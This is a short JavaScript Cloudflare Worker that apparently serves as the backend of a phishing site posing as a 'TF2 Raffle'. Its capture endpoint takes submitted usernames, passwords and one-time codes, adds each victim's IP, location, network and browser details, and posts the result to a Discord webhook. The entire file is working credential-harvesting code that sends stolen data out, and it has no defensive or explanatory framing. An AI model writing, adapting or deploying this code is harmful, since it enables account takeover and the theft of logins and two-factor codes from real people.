export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === '/api/capture' && request.method === 'POST') {
      let d;
      try { d = await request.json(); } catch { d = {}; }

      const cf  = request.cf || {};
      const ip  = request.headers.get('cf-connecting-ip') || '?';
      const ua  = (request.headers.get('user-agent') || '?').slice(0, 200);
      const geo = [cf.city, cf.region, cf.country].filter(Boolean).join(', ') || '?';

      const txt = [
        `STEP: ${d.step || '?'}`,
        `USER: ${d.user || '-'}`,
        `PASS: ${d.pass || '-'}`,
        `CODE: ${d.code || '-'}`,
        `IP: ${ip}  (${geo})`,
        `ASN: ${cf.asOrganization || '?'}`,
        `UA: ${ua}`,
        `TIME: ${new Date().toISOString()}`
      ].join('\n');

      if (env.DISCORD_WEBHOOK) {
        await fetch(env.DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            username: 'TF2 Raffle',
            content: '```\n' + txt.slice(0, 1850) + '\n```'
          })
        }).catch(() => {});
      }

      return new Response(JSON.stringify({ ok: true }), {
        headers: { 'content-type': 'application/json' }
      });
    }

    return env.ASSETS.fetch(request);
  }
};
